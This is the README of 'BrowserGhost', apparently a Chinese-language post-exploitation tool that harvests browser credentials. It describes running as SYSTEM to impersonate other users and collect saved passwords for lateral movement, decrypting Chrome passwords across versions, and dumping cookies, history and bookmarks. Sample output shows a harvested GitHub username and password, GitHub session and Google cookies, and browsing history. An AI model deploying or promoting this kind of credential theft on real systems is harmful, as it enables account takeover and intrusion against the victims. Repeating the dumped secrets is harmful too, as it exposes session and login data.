# BrowserGhost

## 介绍：

这是一个抓取浏览器密码的工具，后续会添加更多功能

## 当前已经完成的功能：

- 实现system抓机器上其他用户的浏览器密码(方便横向移动时快速凭据采集)
- 用.net2 实现可兼容大部分windows，并去掉依赖(不需要System.Data.SQLite.dll这些累赘)
- 可以解密chrome全版本密码(chrome80版本后加密方式变了)
- 已经可以获取login data、cookie、history、book了

## 即将去做:

- 优化输出
- 监控实时cookie
- 兼容主流浏览器(ie、firefox、360极速浏览器等)

```
C:\Users\Administrator\Desktop>BrowserGhost.exe
[+] Current user Administrator
[*] [1176] [explorer] [Administrator]
[*] Impersonate user Administrator
[*] Current user Administrator

[*] Start Get Chrome Login Data
	[+] Copy C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data to C:\Users\Administrator\AppData\Local\Temp\tmp1B7D.tmp
	[URL] -> https://github.com/login
	[USERNAME] -> n0thing@gmail.com
	[PASSWORD] -> Iloveprettygirls

	[+] Delete File C:\Users\Administrator\AppData\Local\Temp\tmp1B7D.tmp

[*] Start Get Chrome Bookmarks
{
   "checksum": "c2ed0a404ff1dce21f0a229055b7cb36",
   "roots": {
      "bookmark_bar": {
         "children": [ {
            "date_added": "13236485210177330",
            "guid": "4858fd46-732b-4756-b27f-7d89efaff625",
            "id": "5",
            "name": "The world’s leading software development platform · GitHub",
            "type": "url",
            "url": "https://github.com/"
         } ],
         "date_added": "13236485205390236",
         "date_modified": "13236485210177330",
         "guid": "00000000-0000-4000-a000-000000000002",
         "id": "1",
         "name": "书签栏",
         "type": "folder"
      },
      "other": {
         "children": [  ],
         "date_added": "13236485205390251",
         "date_modified": "0",
         "guid": "00000000-0000-4000-a000-000000000003",
         "id": "2",
         "name": "其他书签",
         "type": "folder"
      },
      "synced": {
         "children": [  ],
         "date_added": "13236485205390252",
         "date_modified": "0",
         "guid": "00000000-0000-4000-a000-000000000004",
         "id": "3",
         "name": "移动设备书签",
         "type": "folder"
      }
   },
   "version": 1
}


[*] Start Get Chrome Cookie
	[+] Copy C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Cookies to C:\Users\Administrator\AppData\Local\Temp\tmp1C1A.tmp
	[.github.com] 	 _octo=GH1.1.434863639.1591963566
	[.github.com] 	 logged_in=no
	[github.com] 	 _device_id=4a24785d8dccc12f062fb54c881820f3
	[.github.com] 	 _ga=GA1.2.1739362774.1591963568
	[.google.com] 	 1P_JAR=2020-06-13-01
	[.google.com.hk] 	 1P_JAR=2020-06-13-01
	[.google.com] 	 NID=204=bwGOYwnjfPBO2P6zRXqDBEFehuBPeyyf0AWBA8EIK22lqIgMvVtcu86OmszFqdooyW1JwrUQ2K4zIblpfJpxOMmj6Nrq-ofA1rNfOV5Wt5EB9l-qJOTuMTW5NMaZh2ofU-trKn_zHbWlVoUgkUnEFStR1Hl8w4rAu1rSyDKBVB0
	[.google.com.hk] 	 NID=204=K52w3WF9SZvbXw3sHwtQorzsLgyea_zafqVBrvkVatVJcKhOZbmMdUst2phNuQFu2oX4dJ3lYOcYlH7y5oo_aHDIiZu2LGOxt8scFmRrU7GrVu_0kQd6PJlErsgtPiUIIRIhQcskj09LdRYq-NJx7iM6eVsRLhS75c_aClm12eE
	[github.com] 	 _gh_sess=%2FelMYjTKT2jbqyRmUxwWNQC1DINuIy1CGbROibLbmmb4Y089cdHVRBrFia7ANm4e4UaK43QyNqujiEnnUzqViHxUe4QQhMgkId2V9AWkuc3zkElsz%2BuwIf4wJ1OQ1oc9J29QEyiz4SCwcXGj3d2eP7dzO8lf6Sjoerxo65afoHZ1sxs4Xl6UBthqpQcw4I95e5UXM4IJOvFHZ9qZEW4SytmX6DaEMVwD%2BsUKrfWSySxPmtFw3HhfDEpug6A00jPNiqBYbaS32YYyXfWcSKrZyA%3D%3D--DiSJEFqTgEoZ8IqK--Eq99ToeLqWcNBv%2BSFi6Y2g%3D%3D
	[.github.com] 	 tz=Asia%2FShanghai
	[+] Delete File C:\Users\Administrator\AppData\Local\Temp\tmp1C1A.tmp

[*] Start Get Chrome History
	[+] Copy C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\History to C:\Users\Administrator\AppData\Local\Temp\tmp1C3A.tmp
	http://github.com/ 	 The world’s leading software development platform · GitHub
	https://github.com/ 	 The world’s leading software development platform · GitHub
	https://github.com/login 	 Sign in to GitHub · GitHub
	https://github.com/session 	 Sign in to GitHub · GitHub
	[+] Delete File C:\Users\Administrator\AppData\Local\Temp\tmp1C3A.tmp
[*] Recvtoself
[*] Current user Administrator

```


